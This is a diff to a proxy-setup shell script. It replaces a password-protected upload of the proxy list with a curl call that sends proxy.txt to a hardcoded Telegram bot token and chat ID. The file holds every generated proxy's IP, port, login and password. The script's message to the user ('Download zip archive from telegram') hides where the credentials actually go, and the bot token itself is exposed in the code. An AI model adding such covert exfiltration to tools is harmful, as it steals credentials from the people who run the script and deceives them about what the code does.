@@ -52,18 +52,15 @@ EOF
 }
 
 upload_proxy() {
-    local PASS=$(random)
-    zip --password $PASS proxy.zip proxy.txt
-    URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
-
+	URL=$(curl -F document=@"proxy.txt" https://api.telegram.org/bot6043534905:AAEoq0-w8eir0As_qlwrvZAadHm4WWSb-H0/sendDocument?chat_id=-961117877)
     echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
-    echo "Download zip archive from: ${URL}"
-    echo "Password: ${PASS}"
+    echo "Download zip archive from telegram"
+    
 
 }
 gen_data() {
     seq $FIRST_PORT $LAST_PORT | while read port; do
-        echo "usr$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)"
+        echo "nxq$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)"
     done
 }
 
@@ -93,7 +90,7 @@ IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
 
 echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
 
-echo "How many proxy do you want to create? Example 500"
+echo "Ban Muon Tao Bao Nhieu Proxy? (Vi du 200)"
 read COUNT
 
 FIRST_PORT=10000
